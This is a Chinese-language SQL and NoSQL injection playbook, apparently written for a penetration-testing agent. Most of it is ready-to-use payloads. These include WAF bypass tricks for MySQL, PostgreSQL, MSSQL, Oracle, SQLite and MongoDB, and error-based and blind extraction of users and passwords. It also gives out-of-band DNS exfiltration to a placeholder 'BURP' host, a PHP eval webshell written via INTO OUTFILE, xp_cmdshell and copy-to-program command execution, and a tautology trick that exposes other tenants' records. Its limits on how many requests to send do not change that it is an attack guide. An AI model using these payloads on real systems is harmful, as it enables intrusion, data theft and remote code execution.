## 一、漏洞确认 | 两层递进 先定有没有再定具体类型

1. **第一层·有没有注入**:引号(`"`/`'`/`` ` ``)、**括号(`)`/`(`/`]`/`}`,看报错判断语句闭合层数,这么常见的先试)**、分号(`;`)、注释(`--`/`#`/`/**/`)、NoSQL 操作符(`$ne`/`$gt`/`$lt`/`$where`/`$or`/`$regex`/`$in`)在各位置(query 值/json body/header/path)试,405 后换位置不只换编码(query→json→header→path 轮换),看响应差异——SQL 语法报错 / 回显变化 / 状态码跳 / 延时
2. **第二层·哪种 SQL + 哪个位置**:SQL(mysql/pgsql/mssql/oracle/sqlite)还是 NoSQL(mongo/couch);语句哪个位置(select 列 / where / order by / group by / having / insert values / update set / delete / limit)——位置决定闭合方式(数字型不用闭合,字符型要配引号,order by 不能 union 要走报错/延时)
3. **类型 + 回显**(第一层确认后细化,回显决定利用方式):数字型/字符型/搜索型/报错型/盲注;回显——全回显→union;报错→报错外带;无回显→boolean/time 逐字符;NoSQL→`$regex` 逐字符

## 二、绕过思路 | 非常规值 常规的 WAF 早封——按后端类型依次对应

- **WAF 通用小众**:关键字过滤→大小写 `SeLeCT`/内联注释当空格 `SELECT/**/x`/`%0a`/`%0b`/`%0c` 换行代空格/双重 URL 编码/`%00` 截断/Unicode 全角同形;**HPP 参数污染**(同参多次,前端 WAF 与后端 DB 取值不同);**chunked 分块**拆关键字跨块;超长参数填充让 WAF 检测超时放弃
- **MySQL 小众**:`/*!50000select*/` 版本注释(DB 执行注释内容、WAF 不识别版本号)、`handler t open;handler t read first`(替代 `select` 绕 select 关键字)、`VALUES ROW(1,2)`(8.0 构造行)、报错函数小众(`exp(~(select*from(select user())a))`/`polygon((select*from))`/`linestring`/`json_keys`,非 `extractvalue`/`updatexml` 常规那俩)、`set @a=...;prepare st from @a;execute st`(变量+预处理绕关键字)、反引号 `` ` `` 标识符
- **pgsql 小众**:`$$dollar$$` 引用绕引号过滤、`CHR(65)||CHR(66)` 拼接绕字符串黑名单、`::regclass`/`::text` 类型转换、堆叠 plpgsql(`;CREATE FUNCTION...`)、`generate_series(1,1000000)` 延时替代 `pg_sleep`
- **mssql 小众**:`sp_oacreate`/`sp_oamethod`(OLE 自动化,绕 `xp_cmdshell` 被禁)、`OPENROWSET`/`OPENDATASOURCE` 跨库查、堆叠默认支持(`;`)、`WAITFOR DELAY '0:0:5'` 延时、`CONVERT(int,@@version)` 报错
- **oracle 小众**:`dbms_pipe.receive_message(('a'),10)` 延时、`ctxsys.drithsx.sn(1,(select user from dual))` 报错、`XMLType`/`DBMS_XMLGEN` 外带、`UTL_HTTP`/`UTL_INADDR.get_host_address` OOB(需权限)
- **NoSQL 小众**:重复 key 后值优先(`{"id":"10","id":"100"}` 取 100,绕前置条件)、`$where` JS 注入(`$where:function(){return this.username=='a'}`)、`$regex` 逐字符(`password[$regex]=^m`)、聚合管道 `$expr`/`$function`(MongoDB 4.4+ JS)、`password[$ne]=x`(表单/query 变体,非 JSON body)
- **SQLite 小众**:`char(115,104,101,108,108)` 拼接绕引号黑名单(=`shell`)、`unicode()`/`quote()` 辅助、不支持 `/* */` 注释(用 `--`)、`json_extract` 报错外带、无 sleep 延时用 `randomblob(100000000)` 或 `replace(zeroblob(100000000),0,0)`

## 三、漏洞证明 | 禁止批量读取数据 

- **读库名表名(下限,证到能拖库结构)**:union 查——`union select database(),version()`(mysql/pgsql/mssql `@@version`/`version()`);`information_schema.tables`/`.columns`(mysql/pgsql/mssql)、Oracle `all_tables`/`all_tab_columns`、SQLite `sqlite_master`;NoSQL `db.collection.find()` / `$where` 枚举
- **报错外带**:`extractvalue(1,concat(0x5c,(select user())))`/`updatexml`(mysql)、`CAST((select password from users limit 1) AS int)`(pgsql)、`CONVERT(int,@@version)`(mssql)、`ctxsys.drithsx.sn`(oracle)
- **盲注逐字符**:boolean(条件真假响应差)+ time(`SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`/`generate_series`);NoSQL `$regex=^m`/`^md` 逐字符
- **该证数量还证**:union `limit N` / 报错逐条 / 盲注逐字符 → 证能 dump 多少行多少表(证危害程度,不只证能注)
- **OOB 带外(全盲,无回显无报错)**:DNS 外带——mysql `LOAD_FILE('\\\\BURP\\a')`(Windows)/`INTO OUTFILE`、mssql `xp_dirtree '//BURP/a'`、pgsql `copy (SELECT '') to program 'nslookup BURP'`、oracle `UTL_INADDR.get_host_address('BURP')`;query 拼进子域带数据(`'\\'+@p+'.BURP\\a'`)
- **危害升级(可选,按站,自己写 python PoC)**:mysql `select '<?php eval($_POST[c])?>' into outfile '/var/www/html/x.php'` 写 webshell、mssql `xp_cmdshell 'whoami'`(被禁走 `sp_oacreate`)、pgsql `copy (select '') to program 'cmd'`——RCE 真执行风险高,**证到拖库通常够**,这里只给路径不给 PoC,agent 自己写 python
- **列表筛选 OR 恒真打全库(高危场景)**:企业流水/消费/员工名单这类列表,筛 `employeeName`/姓名/关键字,回包带 `total`/`totalNum`/`totalSize`(后端 ES 或"能跑 SQL 的搜索")。`or (1)=(1)` 去掉租户日期全库匹配,total 上亿是常态。证法:① 填不存在串应空 ② 布尔假 `')and (1)=(2)--` 仍空(证能改逻辑,还没放开全库)③ 恒真 `1')or (1)=(1)--+A` 只打一枪(`(1)=(1)` 绕 `1=1` 拦截),pageSize 保持 1-5,只看 total 差分 + 第一条是**别人**的。约束:不连打/不重放/不 `--dump`/不打删除更新口/打挂集群不算证明。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 `$where`/DSL,别死磕
- **key 鉴权注入**:key/常量当鉴权拼进 SQL(邮件订阅 iframe + 同目录 `list.php?key=`),`1' OR client_id=租户 LIMIT 1#`,回包出该租户订户姓名/邮箱/电话。Wrong Key/空数组是对照

## 四、误报场景

- 预编译拦截(参数化,引号当字符串,注入点不生效)
- 代码层/ORM 拦截(没拼到 sql,框架转义,输入没进 SQL 层)
- 搜索框走 ES 全文搜索(不是 SQL,`or 1=1` 当普通字符串,ES 仅接受 Query DSL)
- total 涨但全是本职可读(没跨租户/越权,不算危害)
- 延时是网络抖动(多请求几次取平均,排除 RTT)
- 报错但没数据(SQL 语法报错≠注入成功,可能只是输入校验报错)
